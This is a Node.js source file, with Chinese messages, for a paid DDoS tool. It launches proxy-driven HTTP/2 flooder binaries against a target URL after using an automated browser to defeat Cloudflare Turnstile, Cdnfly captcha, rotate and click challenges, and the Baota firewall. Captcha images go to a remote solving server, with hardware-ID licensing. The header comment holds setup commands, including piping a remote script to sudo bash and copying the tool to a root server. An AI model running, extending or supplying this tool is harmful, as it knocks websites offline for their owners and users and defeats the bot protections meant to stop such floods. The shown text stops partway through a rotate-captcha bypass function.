/*
rm -rf node_modules
apt --fix-broken install
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
sudo apt-get install -y nodejs
sudo apt-get install -y npm
sudo npm install -g npm@latest
#浏览器安装
wget https://github.com/ungoogled-software/ungoogled-chromium-portablelinux/releases/download/132.0.6834.110-1/ungoogled-chromium_132.0.6834.110-1.AppImage
sudo mv ungoogled-chromium_132.0.6834.110-1.AppImage /usr/local/bin/chromium
sudo chmod +x /usr/local/bin/chromium
sudo ln -sf /usr/local/bin/chromium /usr/bin/chromium
sudo ln -sf /usr/local/bin/chromium /usr/bin/chromium-browser
sudo ln -sf /usr/local/bin/chromium /usr/bin/google-chrome
#浏览器安装
sudo apt update -y && sudo apt install xvfb libvulkan1 ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils -y
npm -dd i xvfb net fs node-fetch@2 randomstring url hpack path colors child_process http2 random-referer request https-proxy-agent axios tls crypto header-generator user-agents cluster fake-useragent puppeteer puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-real-browser randomstring string-random chrome-launcher puppeteer-core async hpack
scp browser root@45.157.11.92:/root
*/
const errorHandler = error => {
	//console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function(item) {
	const index = this.indexOf(item);
	if (index !== -1) {
		this.splice(index, 1);
	}
	return item;
}

const {
	exec
} = require('child_process');
const crypto = require('crypto');
const os = require('os');

function spawnHttp2Process(url, userAgent, time, cookie, method, thread, proxy) {
	return new Promise((resolve, reject) => {
		const args = [url, userAgent, time, cookie, method, thread, proxy];
		const http2Process = spawn('./http2', args);
		http2Process.stdout.on('data', (data) => {});

		http2Process.stderr.on('data', (data) => {});
		http2Process.on('close', (code) => {
			if (code === 0) {
				resolve();
			} else {
				reject(new Error(`洪水脚本启动失败请检查是否授予权限(./http2)`));
			}
		});

		http2Process.on('error', (err) => {
			reject(err);
		});
	});
}

function spawnKittyProcess(url, userAgent, time, cookie, method, thread, proxy, keys) {
    return new Promise((resolve, reject) => {
        const args = [
            '-key', keys, 
            '-url', url, 
            '-time', time, 
			'-cpu', 40, 
            '-threads', '1', 
            '-rate', thread, 
            '-ip', proxy, 
            '-ua', userAgent, 
            '-cookie', cookie, 
            '-method', method, 
            '-debug', '0',
			'-close'
        ];
        const kittyProcess = spawn('./kittys', args);
        kittyProcess.stdout.on('data', (data) => {
        });

        kittyProcess.stderr.on('data', (data) => {
        });
        kittyProcess.on('close', (code) => {
            if (code === 0) {
                resolve();
            } else {
                reject(new Error(`kitty洪水脚本启动失败 请检查是否授予权限或者key是否正确(./kittys)`));
            }
        });
        kittyProcess.on('error', (err) => {
            reject(err);
        });
    });
}


function cloudflareflooder(url, userAgent, time, cookie, method, thread, proxy) {
	return new Promise((resolve, reject) => {
		const args = [url, userAgent, time, cookie, method, thread, proxy];
		const cloudflareflooder = spawn('./httpddos', args);
		//const cloudflareflooder = spawn('/opt/glibc-2.34/lib/ld-linux-x86-64.so.2', ['--library-path', '/opt/glibc-2.34/lib', './httpddos', ...args]);
		cloudflareflooder.stdout.on('data', (data) => {});

		cloudflareflooder.stderr.on('data', (data) => {});
		cloudflareflooder.on('close', (code) => {
			if (code === 0) {
				resolve();
			} else {
				reject(new Error(`洪水脚本启动失败请检查是否授予权限或库是否兼容(./httpddos)`));
			}
		});

		cloudflareflooder.on('error', (err) => {
			console.log(`err ${err}`)
			reject(err);
		});
	});
}

function getSign(hwid) {
	const secret = 'nobbos1337!';
	const hash = crypto.createHash('md5');
	hash.update(hwid + secret);
	return hash.digest('hex');
}

function getHWID() {
    return new Promise((resolve, reject) => {
        const platform = os.platform();

        if (platform === 'linux') {
            exec('cat /etc/machine-id || cat /var/lib/dbus/machine-id', (error, stdout, stderr) => {
                if (error) {
                    reject(`Error: ${error.message}`);
                } else if (stderr) {
                    reject(`Stderr: ${stderr}`);
                } else {
                    resolve(stdout.trim());
                }
            });
        } else if (platform === 'win32') {
            exec('powershell.exe -Command "Get-WmiObject -Class Win32_ComputerSystemProduct | ForEach-Object { $_.UUID }"', (error, stdout, stderr) => {
                if (error) {
                    reject(`Error: ${error.message}`);
                } else if (stderr) {
                    reject(`Stderr: ${stderr}`);
                } else {
                    const hwid = stdout.trim();
                    resolve(hwid);
                }
            });
        } else {
            reject('Unsupported platform');
        }
    });
}

const COOKIES_MAX_RETRIES = 1;
//let server_url = "https://browser.nobbos-team-lol.xyz";
let server_url = "http://156.238.231.103:1337";
//let server_url = "http://127.0.0.1:1337";
const async = require("async");
const fs = require("fs");
const {
	connect
} = require('puppeteer-real-browser');
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
async function Auth() {
	const hwid = await getHWID();
	const sign = getSign(hwid);

	const raw = JSON.stringify({
		"hwid": hwid,
		"sign": sign
	});

	const requestOptions = {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json'
		},
		body: raw,
		redirect: 'follow'
	};

	fetch(server_url + "/auth", requestOptions)
		.then(response => {
			if (!response.ok) {
				console.log("[-] 验证失败 可能账户到期或未授权 - 您的HWID: " + hwid);

				process.exit(1);
			}
			return response.json();
		})
		.then(result => {
			const {
				status,
				username,
				expire_date
			} = result;

			if (status) {
				console.log("[+] 验证成功");
				console.log("- 用户名:", username);
				console.log("- 到期时间:", expire_date);
				console.log("[~] Please Wait Browser Start...");
				__main__();
				setTimeout(function() {
					process.exit();
				}, process.argv[7] * 1000);
			}
		})

		.catch(error => {
			console.log("[-] 验证失败 请检查您的网络或服务器死亡 - 您的HWID: " + hwid);
			process.exit(1);
		});
}

//Auth();

function showHelp() {
	console.clear();
	console.error('Usage: node Browser.js target thread proxy rer(perProxy) duration(perProxy) duration flood(on/off) isRebypass(on/off) --[arg]*');
	console.error('|target: 目标');
	console.error('|threads: 线程数量');
	console.error('|proxyFile: 代理文件');
	console.error('|rates: 每个代理的请求速率');
	console.error('|duration(perProxy): 单个代理洪水的持续时间');
	console.error('|times: 全局攻击时间(绕过时长+攻击时长)');
	console.error('|isFlood: 开启绕过后洪水 建议on开启 (on/off).');
	console.error('|isRebypass: 洪水结束后是否重新绕过并重新攻击(可轮询时开启), 适用于在你代理IP较少的时候, 在代理IP多的情况下会减少你的速率 (在速率限制严格的站点和代理IP数量多时[只会使用你启动对应线程数量的代理IP数,并且剩余IP不会被使用到]谨慎开启) (on/off).');
	console.error(`|其他参数(可选):
--help/--: 显示当前帮助页面
--cloudflare: 主动使用绕httpddos的cf洪水
--http2: 强制使用http2洪水 即使目标为cf
--noheadless: 强制使用有头浏览器 仅作为开发模式使用
--kitty <key>: 使用kitty的洪水 需要目录下有名称为kittys的洪水脚本并且有kitty洪水脚本的使用权限 <key>要填写为你购买后kt给你的key`);
	process.exit(1);
}
const args = process.argv.slice(2);
const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxyFile = process.argv[4];
const rates = process.argv[5];
const times = process.argv[7]
const duration = process.argv[6];
const isFlood = process.argv[8];
const isRebypass = process.argv[9];
let iscloudflare = false;
const additionalArgs = args.filter(arg => arg.startsWith('--'));
const ishelp = args.includes('--help') || args.includes('--');
const usecloudflaremode = args.includes('--cloudflare');
const usehttp2 = args.includes('--http2');
const userheadbrowser = args.includes('--noheadless');
const iskittyflooder = args.includes('--kitty');
const kittyIndex = args.indexOf('--kitty');
let kittyKey = false;
if (iskittyflooder) {
	if (kittyIndex !== -1 && args[kittyIndex + 1]) {
		kittyKey = args[kittyIndex + 1];
	} else {
		console.log('[!] 您尝试使用kitty洪水但是没有key参数: --kitty <key>');
		process.exit(1);
	}
}
if (!targetURL || !threads || !proxyFile || !rates || !duration || typeof isFlood === 'undefined' || typeof isRebypass === 'undefined' || ishelp) {
	showHelp();
}
if (userheadbrowser) { ishead = true; }
if (usecloudflaremode) { 
	iscloudflare = true;
}
if (usecloudflaremode) { 
	iscloudflare = true;
}
const fileContent = fs.readFileSync(proxyFile, 'utf8');
const proxiesCount = fileContent.split('\n').length;
console.log("-Target URL:", targetURL);
console.log("-Threads:", threads);
console.log("-Proxy File:", proxyFile);
console.log("-Proxies Count:", proxiesCount);
console.log("-Rates(perProxy):", rates);
console.log("-Duration(perProxy):", duration);
console.log("-times:", times);
console.log("-Flood Mode:", isFlood);
console.log("-rebypass:", isRebypass);
const requestsPerSecond = rates / duration;
const totalRequestsPerProxy = rates * duration;
console.log("-" + requestsPerSecond + " Req/s (perproxy)");
console.log("-Total req perproxy:", totalRequestsPerProxy);
if (additionalArgs.length > 0) {
	console.log("-Add Options:");
	additionalArgs.forEach(arg => {
		console.log(`  ${arg}`);
	});
} else {
	console.log("-Add Options: None");
}
console.log("—————————————Attack Starting—————————————");
//console.log("[~] Please Wait Auth...");
let floodMode;
let rebypassMode;
let bypassdone = true;
let statusCodeStats = {};
if (isFlood === 'on') {
	floodMode = "(flooder enable)";
} else if (isFlood === 'off') {
	floodMode = "(flooder disable)";
} else {
	process.exit(1);
}
if (isRebypass === 'on') {
	rebypassMode = "(rebypass enable)";
} else if (isRebypass === 'off') {
	rebypassMode = "(rebypass disable)";
} else {
	process.exit(1);
}
let challengeCount = 0;
let cachedResponse = null;
let captchaCode2 = null;
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const {
	spawn
} = require("child_process");
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);
const colors = {
	COLOR_RED: "\x1b[31m",
	COLOR_GREEN: "\x1b[32m",
	COLOR_YELLOW: "\x1b[33m",
	COLOR_RESET: "\x1b[0m",
	COLOR_PURPLE: "\x1b[35m",
	COLOR_CYAN: "\x1b[36m",
	COLOR_BLUE: "\x1b[34m",
};

function colored(colorCode, text) {
	console.log(colorCode + text + colors.COLOR_RESET);
};

async function GetCdnflyCaptcha(img) {
	const hwid = await getHWID();
	const sign = getSign(hwid);

	const blob = new Blob([img], {
		type: 'image/jpeg'
	});

	const formdata = new FormData();
	formdata.append("img", blob, "Captcha");

	const requestOptions = {
		method: 'POST',
		body: formdata,
		redirect: 'follow',
	};

	return fetch(server_url + "/cdnfly/captcha?token=" + hwid + "&sign=" + sign, requestOptions)
		.then(async response => {
			if (!response.ok) {
				return {
					status: false,
					captchaCode: "none",
					times: "none"
				};
			}
			return await response.json();
		})
		.then(result => {
			const {
				status,
				captchaCode,
				times
			} = result;

			return {
				status,
				captchaCode,
				times
			};
		})
		.catch(error => {
			return {
				status: false,
				captchaCode: "none",
				times: "none"
			};
		});
}

async function GetGoedgeGeetestSlide(bgimg, blockimg) {
	const hwid = await getHWID();
	const sign = getSign(hwid);

	const bgimgblob = new Blob([bgimg], {
		type: 'image/jpeg'
	});

	const blockimgblob = new Blob([blockimg], {
		type: 'image/jpeg'
	});


	const formdata = new FormData();
	formdata.append("bg_img", bgimgblob, "bgimg");
	formdata.append("block_img", blockimgblob, "blockimg");

	const requestOptions = {
		method: 'POST',
		body: formdata,
		redirect: 'follow',
	};

	return fetch(server_url + "/goedge/geetest?token=" + hwid + "&sign=" + sign, requestOptions)
		.then(async response => {
			if (!response.ok) {
				return {
					status: false,
					distance: "none",
					times: "none"
				};
			}
			return await response.json();
		})
		.then(result => {
			const {
				status,
				distance,
				times
			} = result;

			return {
				status,
				distance,
				times
			};
		})
		.catch(error => {
			return {
				status: false,			
				distance: "none",
				times: "none"
			};
		});
}

async function GetCdnflyAngle(url, img, guard="null") {
	async function GetCdnflyRotateInfo(img, ver) {
		const hwid = await getHWID();
		const sign = getSign(hwid);

		const blob = new Blob([img], {
			type: 'image/jpeg'
		});

		const formdata = new FormData();
		formdata.append("img", blob, "rotate");

		const requestOptions = {
			method: 'POST',
			body: formdata,
			redirect: 'follow',
		};

		return fetch(server_url + `/cdnfly/rotate?ver=${ver}&token=` + hwid + "&sign=" + sign + `&guard=${guard}`, requestOptions)
			.then(async response => {
				if (!response.ok) {
					return {
						status: false,
						times: "none",
						guardret: "none",
						rotate_angle: "none",
						angle: "none"
					};
				}
				return await response.json();
			})
			.then(result => {
				const {
					status,
					times,
					guardret,
					rotate_angle,
					angle
				} = result;

				return {
					status,
					times,
					guardret,
					rotate_angle,
					angle
				};
			})
			.catch(error => {
				return {
					status: false,
					times: "none",
					guardret: "none",
					rotate_angle: "none",
					angle: "none"
				};
			});
	}

	try {
		if (cachedResponse) {
			if (cachedResponse[0] == "v1") {
				var EncryptDataAndVer = ["v1", await GetCdnflyRotateInfo(img, 'v1')];	
				cachedResponse = EncryptDataAndVer;
				return EncryptDataAndVer;
			} else if (cachedResponse[0] == "v3") {
				var EncryptDataAndVer = ["v3", await GetCdnflyRotateInfo(img, 'v3')];
				cachedResponse = EncryptDataAndVer;
				return EncryptDataAndVer;
			} else {
				var EncryptDataAndVer = ["v2", await GetCdnflyRotateInfo(img, 'v2')];	
				cachedResponse = EncryptDataAndVer;
				return EncryptDataAndVer;
			}
		}
	} catch (err) {
		var EncryptDataAndVer = ["fail", {
			status: false,
			times: "none",
			guardret: "none",
			rotate_angle: "none",
			angle: "none"
		}];
		return EncryptDataAndVer;
	}

	try {
		const response = await fetch(url + '/_guard/rotate.js');
		if (!response.ok) {
			throw new Error('Network response was not ok');
		}
		const data = await response.text();
		if (data.includes("jsjiami.com.v6")) {
			var EncryptDataAndVer = ["v1", await GetCdnflyRotateInfo(img, 'v1')];	
			cachedResponse = EncryptDataAndVer;
			return EncryptDataAndVer;
		} else if (data.includes("_0xodj='v2'")) {
			var EncryptDataAndVer = ["v3", await GetCdnflyRotateInfo(img, 'v3')];
			cachedResponse = EncryptDataAndVer;
			return EncryptDataAndVer;
		} else {
			var EncryptDataAndVer = ["v2", await GetCdnflyRotateInfo(img, 'v2')];	
			cachedResponse = EncryptDataAndVer;
			return EncryptDataAndVer;
		}
	} catch (err) {
		var EncryptDataAndVer = ["fail", {
			status: false,
			times: "none",
			guardret: "none",
			rotate_angle: "none",
			angle: "none"
		}];
		return EncryptDataAndVer;
	}
}

async function GetCdnflyNewClick(img, guard, guardword) {

	try {
		const hwid = await getHWID();
		const sign = getSign(hwid);

		const blob = new Blob([img], {
			type: 'image/jpeg'
		});

		const formdata = new FormData();
		formdata.append("img", blob, "click");

		const requestOptions = {
			method: 'POST',
			body: formdata,
			redirect: 'follow',
		};

		return fetch(`${server_url}/cdnfly/newclick?token=${hwid}&sign=${sign}&guard=${guard}&guardword=${guardword}`, requestOptions)
			.then(async response => {
				if (!response.ok) {
					return {
						status: false,
						times: "none2",
						guardret: "none2",
					};
				}
				return await response.json();
			})
			.then(result => {
				const {
					status,
					times,
					guardret,
				} = result;

				return {
					status,
					times,
					guardret,
				};
			})
			.catch(error => {
				return {
					status: false,
					times: "none",
					guardret: "none",
				};
			});
	} catch (err) {
		var Data = {
			status: false,
			times: "none",
			guardret: "none"
		};
		return Data;
	}
}

async function GetCdnflyNewSlide(img, guard, guardword) {

	try {
		const hwid = await getHWID();
		const sign = getSign(hwid);

		const blob = new Blob([img], {
			type: 'image/jpeg'
		});

		const formdata = new FormData();
		formdata.append("img", blob, "click");

		const requestOptions = {
			method: 'POST',
			body: formdata,
			redirect: 'follow',
		};

		return fetch(`${server_url}/cdnfly/newslide?token=${hwid}&sign=${sign}&guard=${guard}&guardword=${guardword}`, requestOptions)
			.then(async response => {
				if (!response.ok) {
					return {
						status: false,
						times: "none2",
						guardret: "none2",
					};
				}
				return await response.json();
			})
			.then(result => {
				const {
					status,
					times,
					guardret,
				} = result;

				return {
					status,
					times,
					guardret,
				};
			})
			.catch(error => {
				return {
					status: false,
					times: "none",
					guardret: "none",
				};
			});
	} catch (err) {
		var Data = {
			status: false,
			times: "none",
			guardret: "none"
		};
		return Data;
	}
}

async function detectChallenge(browserProxy, page, browser, targetURL) {
	const title = await page.title();
	const content = await page.content();

	if (title === "Attention Required! | Cloudflare" || title.includes("Access denied")) {
		colored(colors.COLOR_YELLOW, "[-] Cloudflare Proxy blocked " + browserProxy);
		bypassdone = false;
		throw new Error("Proxy blocked");
	}

	if (content.includes("challenge-error-text")) {
		colored(colors.COLOR_PURPLE, "[+] Found CloudFlare challenge " + browserProxy);
		iscloudflare = true;
		maxAttempts = 3;
		index = 0;
		try {
			while (index < maxAttempts) {
				
				await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 100000 });
				const title2 = await page.title();
				const isbypassCfTurnstile = await page.$$('[name="cf-turnstile-response"]');
				if (
					isbypassCfTurnstile.length === 0 && 
					(!title2.includes("Just a moment...") && !title2.includes("请稍候..."))
				) {
					colored(colors.COLOR_GREEN, "[-] Bypass CloudFlare challenge(type1) " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_RESET, "[~] Switch Turnstile Bypass Mode " + browserProxy);
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 20000
					});
					await sleep(6);
				}
				try {
					const elements = await page.$$('[name="cf-turnstile-response"]');
					if (elements.length === 0) {
						const coordinates = await page.evaluate(() => {
							const coords = [];
							const checkDivs = () => {
								document.querySelectorAll('div').forEach(item => {
									const rect = item.getBoundingClientRect();
									const style = window.getComputedStyle(item);
									if (style.margin === "0px" && style.padding === "0px" && rect.width > 290 && rect.width <= 310 && !item.querySelector('*')) {
										coords.push({
											x: rect.x,
											y: rect.y,
											w: rect.width,
											h: rect.height
										});
									}
								});
							};
							checkDivs();
							if (coords.length === 0) checkDivs();
						});

						for (const {
								x,
								y,
								h
							}
							of coordinates) {
							await page.mouse.click(x + 30, y + h / 2);
						}

					} else {
						for (const element of elements) {
							const parent = await element.evaluateHandle(el => el.parentElement);
							const box = await parent.boundingBox();
							await page.mouse.click(box.x + 30, box.y + box.height / 2);
						}
					}
				} catch (err) {}

				await sleep(6)
				const title = await page.title();
				const isbypassCfTurnstile2 = await page.$$('[name="cf-turnstile-response"]');

				if (isbypassCfTurnstile2.length === 0 && (!title.includes("Just a moment...") || !title.includes("请稍候..."))) {
					colored(colors.COLOR_GREEN, "[-] Bypass CloudFlare challenge " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Bypass CloudFlare challenge Try again " + browserProxy);
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 20000
					});
				}

				index++;
			}
		} catch (err) {
			bypassdone = true;
			throw new Error("Fail Bypass");
		} finally {
			await sleep(3);
			return;
		}
	}

	if (content.includes("/_guard/html.js?js=click_html")) {
		const currentURL = await page.url();
		const parsedURL = new URL(currentURL);
		const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
		await page.goto(`${baseURL}/_guard/click.jpg`, {
			waitUntil: "domcontentloaded",
			timeout: 120000
		});
		const newclickcookies = await page.cookies();
		const isnewclick = newclickcookies.find(cookie => cookie.name === 'guarddata');
		if (isnewclick) {
			await CdnflyNewClick()
			return;
		} else {
			await page.goto(targetURL, {
				waitUntil: "domcontentloaded",
				timeout: 120000
			});

			await CdnflyClick()
			return;
		}
	}

	async function CdnflyNewClick() { 
		colored(colors.COLOR_PURPLE, "[+] Found Cdnfly NewClick challenge " + browserProxy);
		try {
			const maxAttempts = 5;
			let index = 0;
			while (index < maxAttempts) {
				await page.waitForNavigation({ waitUntil: 'networkidle2' });
				const currentURL = await page.url();
				const parsedURL = new URL(currentURL);
				const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
				const timestamp = Date.now();
				const clickImageUrl = `${baseURL}/_guard/click.jpg?t=${timestamp}`;
	
				const response = await page.goto(clickImageUrl, {
					waitUntil: "networkidle0",
					timeout: 120000
				});
				const buffer = await response.buffer();
				const newclickcookies = await page.cookies();
				const guard = newclickcookies.find(cookie => cookie.name === 'guard');
				const guardword = newclickcookies.find(cookie => cookie.name === 'guardword');
	
				const { status, guardret, times } = await GetCdnflyNewClick(buffer, guard.value, guardword.value);
				if (status) {
					colored(colors.COLOR_GREEN, `[-] Successful CdnflyNewClick guardret: ${guardret} | times: ${times} - ${browserProxy}`);
				} else {
					colored(colors.COLOR_YELLOW, `[!] Fail Cdnfly NewClick Try again ${browserProxy}`);
					bypassdone = false;
					index++;
					continue;
				}
	
				await page.setCookie({
					name: 'guardret',
					value: guardret,
					domain: parsedURL.hostname
				});
	
				await page.goto(targetURL, {
					waitUntil: "networkidle0",
					timeout: 120000
				});
	
				const content = await page.content();
				if (!content.includes("/_guard/html.js?js=click_html")) {
					colored(colors.COLOR_GREEN, `[-] Bypass Cdnfly NewClick challenge ${targetURL} - ${browserProxy}`);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, `[!] Fail Bypass Cdnfly NewClick challenge Try again ${targetURL} - ${browserProxy}`);
					bypassdone = false;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			await page.goto(targetURL, {
				waitUntil: "networkidle0",
				timeout: 120000
			});
			await sleep(5);
			return;
		}
	}
	
	async function CdnflyClick() { 
		colored(colors.COLOR_PURPLE, "[+] Found Cdnfly Click challenge " + browserProxy);
		try {
			const maxAttempts = 3;
			let index = 0;
			while (index < maxAttempts) {
				await page.waitForNavigation({ waitUntil: 'networkidle0' });
				await sleep(1);
				const content = await page.content();
	
				await page.waitForSelector('body', { timeout: 30000 });
				let accessButton;
				if (await page.$('.main #access')) {
					accessButton = await page.$('.main #access');
				} else {
					accessButton = await page.$('#access');
				}
	
				await accessButton.click();
				await page.waitForNavigation({ waitUntil: 'networkidle0' });
	
				const newContent = await page.content();
				if (!newContent.includes("/_guard/html.js?js=click_html")) {
					colored(colors.COLOR_GREEN, `[-] Bypass Cdnfly Click challenge ${browserProxy}`);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, `[!] Fail Bypass Cdnfly Click challenge Try again ${browserProxy}`);
					bypassdone = false;
					await page.goto(targetURL, {
						waitUntil: "networkidle0",
						timeout: 120000
					});
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			await sleep(3);
			return;
		}
	}
	
	if (content.includes("/_guard/html.js?js=delay_jump_html")) {
		colored(colors.COLOR_PURPLE, "[+] Found Cdnfly delay challenge " + browserProxy);
		try {
			const maxAttempts = 3;
			let index = 0;
			while (index < maxAttempts) {
				await sleep(10);
				const content = await page.content();
				if (!content.includes("/_guard/html.js?js=delay_jump_html")) {
					colored(colors.COLOR_GREEN, `[-] Bypass Cdnfly delay challenge ${browserProxy}`);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, `[!] Fail Bypass Cdnfly delay challenge Try again ${browserProxy}`);
					bypassdone = false;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			return;
		}
	}

	if (content.includes("宝塔防火墙正在检查您的访问") === true) {
		colored(colors.COLOR_PURPLE, "[+] Found baota dogshit challenge " + browserProxy);
		try {
			maxAttempts = 3;
			index = 0;
			while (index < maxAttempts) {
				await sleep(10);
				colored(colors.COLOR_GREEN, "[-] Bypass baota dogshit challenge " + browserProxy);
				bypassdone = true;
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			return;
		}
	}

	if (content.includes("/_guard/html.js?js=captcha_html") === true) {
		colored(colors.COLOR_PURPLE, "[+] Found Cdnfly Captcha challenge " + browserProxy);
		try {
			maxAttempts = 5;
			index = 0;
			while (index < maxAttempts) {
				const currentURL = await page.url();
				const parsedURL = new URL(currentURL);
				const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
				const timestamp = new Date().valueOf();
				const captchaImageUrl = `${baseURL}/_guard/captcha.png?t=${timestamp}`;
				const viewSource = await page.goto(captchaImageUrl, {
					waitUntil: "domcontentloaded",
					timeout: 120000
				});
				await sleep(1);
				const buffer = await viewSource.buffer();
				Captchadata = await GetCdnflyCaptcha(buffer);
				const {
					status,
					captchaCode,
					times
				} = Captchadata;
				if (captchaCode === captchaCode2) {
					continue;
				}
				captchaCode2 = captchaCode;
				if (status) {
					colored(colors.COLOR_GREEN, "[-] Successful Cdnfly CaptchaCode&guardret: " + captchaCode + " | times: " + times + " - " + browserProxy);
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Cdnfly CaptchaCode Try again " + browserProxy);
					bypassdone = false;
					index++;
					continue;
				}

				await page.setCookie({
					name: 'guardret',
					value: captchaCode,
					domain: new URL(currentURL).hostname
				});

				await page.goto(targetURL, {
					waitUntil: "domcontentloaded",
					timeout: 120000
				});
				const content = await page.content();
				if (!content.includes("/_guard/html.js?js=captcha_html")) {
					colored(colors.COLOR_GREEN, "[-] Bypass Cdnfly Captcha challenge " + targetURL + " - " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Bypass Cdnfly Captcha challenge Try again " + targetURL + " - " + browserProxy);
					bypassdone = false;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			await page.goto(targetURL, {
				waitUntil: "domcontentloaded",
				timeout: 120000
			});
			await sleep(5);
			return;
		}
	}

	if (content.includes("/_guard/html.js?js=rotate_html")) {
		await page.goto(targetURL, {
			waitUntil: "domcontentloaded",
			timeout: 120000
		});
		await sleep(1);
		const newrotatecookies = await page.cookies();
		const isnewrotate = newrotatecookies.find(cookie => cookie.name === 'guarddata');
		if (isnewrotate) {
			await CdnflyNewRotate()
			return;
		} else {
			await page.goto(targetURL, {
				waitUntil: "domcontentloaded",
				timeout: 120000
			});

			await CdnflyRotate()
			return;
		}
	}

	async function CdnflyNewRotate() {
		colored(colors.COLOR_PURPLE, "[+] Found NewCdnfly Rotate challenge " + browserProxy);
		try {
			maxAttempts = 5;
			index = 0;
			while (index < maxAttempts) {
				const currentURL = await page.url();
				const parsedURL = new URL(currentURL);
				const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
				const timestamp = new Date().valueOf();
				const rotateImageUrl = `${baseURL}/_guard/rotate.png?t=${timestamp}`
				const viewSource = await page.goto(rotateImageUrl, {
					waitUntil: "domcontentloaded",
					timeout: 120000
				});
				await sleep(1);
				const newrotatecookies = await page.cookies();
				const guard = newrotatecookies.find(cookie => cookie.name === 'guard');
				const buffer = await viewSource.buffer();
				data = await GetCdnflyAngle(baseURL, buffer, guard.value);
				const {
					status,
					times,
					guardret,
					rotate_angle,
					angle
				} = data[1];
				if (status) {
					colored(colors.COLOR_GREEN, "[-] Successful NewCdnfly RotateAngle: " + rotate_angle + " | guardret(Encrypt): " + guardret + " | times: " + times + " - " + browserProxy);
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail NewCdnfly Rotate Try again " + browserProxy);
					bypassdone = false;
					index++;
					continue;
				}

				await page.setCookie({
					name: 'guardret',
					value: guardret,
					domain: new URL(currentURL).hostname
				});

				await page.goto(targetURL, {
					waitUntil: "domcontentloaded",
					timeout: 120000
				});
				const content = await page.content();
				const title = await page.title();
				if (title.includes("Verification")) {
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 120000
					});
				}
				if (!content.includes("/_guard/html.js?js=rotate_html")) {
					colored(colors.COLOR_GREEN, "[-] Bypass NewCdnfly Rotate challenge " + targetURL + " - " + browserProxy);
					bypassdone = true;
					break;
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Bypass NewCdnfly Rotate challenge Try again " + targetURL + " - " + browserProxy);
					bypassdone = false;
				}
				index++;
			}
		} catch (err) {
			bypassdone = false;
			throw new Error("Fail Bypass");
		} finally {
			await page.goto(targetURL, {
				waitUntil: "domcontentloaded",
				timeout: 120000
			});
			await sleep(5);
			return;
		}
	}

	async function CdnflyRotate() {
		colored(colors.COLOR_PURPLE, "[+] Found Cdnfly Rotate challenge " + browserProxy);
		try {
			maxAttempts = 5;
			index = 0;
			while (index < maxAttempts) {
				const currentURL = await page.url();
				const parsedURL = new URL(currentURL);
				const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
				const timestamp = new Date().valueOf();
				const rotateImageUrl = `${baseURL}/_guard/rotate.jpg?t=${timestamp}`
				const viewSource = await page.goto(rotateImageUrl, {
					waitUntil: "domcontentloaded",
					timeout: 120000
				});
				await sleep(1);
				const buffer = await viewSource.buffer();
				data = await GetCdnflyAngle(baseURL, buffer);
				const {
					status,
					times,
					guardret,
					rotate_angle,
					angle
				} = data;
				if (status) {
					colored(colors.COLOR_GREEN, "[-] Successful Cdnfly RotateAngle: " + rotate_angle + " | guardret(Encrypt): " + guardret + " | times: " + times + " - " + browserProxy);
				} else {
					colored(colors.COLOR_YELLOW, "[!] Fail Cdnfly Rotate Try again " + browserProxy);
					bypassdone = false;
					index++;
					continue;
				}

				await page.setCookie({
					name: 'guardret',
					value: guardret,
					domain: new URL(currentURL).hostname
				});

				await page.goto(targetURL, {
					waitUntil: "domcontentloaded",
					timeout: 120000
				});
				const content = await page.content();
				const title = await page.title();
				if (title.includes("rotate.jpg")) {
					await page.goto(targetURL, {
						waitUntil: "domcontentloaded",
						timeout: 120000
					});
				}
				if (!content.includes("/_guard/html.js?js=rotate_html")) {
					colored(colors.COLOR_GREEN, "[-] Bypass Cdnfly Rotate challenge " + targetURL + " - " + browserProxy);
					bypassdone = true;
					break;
				} else {
